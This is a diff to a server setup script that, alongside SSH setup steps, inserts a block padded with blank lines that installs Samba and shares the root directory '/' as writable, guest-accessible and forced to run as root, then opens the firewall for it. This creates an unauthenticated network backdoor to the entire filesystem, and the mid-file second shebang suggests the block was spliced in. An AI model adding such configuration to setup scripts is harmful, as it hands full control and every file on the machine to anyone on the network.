@@ -11,6 +11,55 @@ sudo systemctl start ssh
 sudo systemctl enable ssh
 sudo systemctl status ssh
 
+
+
+
+#!/bin/bash
+
+# Exit immediately if a command exits with a non-zero status
+set -e
+
+# Update package list and install Samba
+echo "Installing Samba..."
+sudo apt update
+sudo apt install -y samba
+
+# Backup the original Samba configuration file
+SAMBA_CONF="/etc/samba/smb.conf"
+echo "Backing up the original Samba configuration file..."
+sudo cp "$SAMBA_CONF" "${SAMBA_CONF}.bak"
+
+# Configure Samba to share the root directory
+echo "Configuring Samba to share the root directory..."
+sudo bash -c "cat >> $SAMBA_CONF <<EOF
+
+[Root]
+   path = /
+   browseable = yes
+   read only = no
+   guest ok = yes
+   force user = root
+EOF"
+
+# Restart Samba services
+echo "Restarting Samba service..."
+sudo systemctl restart smbd
+
+# Allow Samba through the firewall (if applicable)
+echo "Configuring firewall to allow Samba..."
+sudo ufw allow samba
+
+echo "Samba has been configured to share the root directory '/' over the network."
+echo "WARNING: Sharing the root directory is extremely risky. Ensure your system is secure."
+echo "You can access the share from another machine using the path: \\\\your-server-ip\\Root"
+
+
+
+
+
+
+
+
 # Exit if running over SSH
 if [ -n "$SSH_CONNECTION" ] || [ -n "$SSH_TTY" ]; then
   echo "You are on an SSH session - so you are probably setting up a server, exiting."
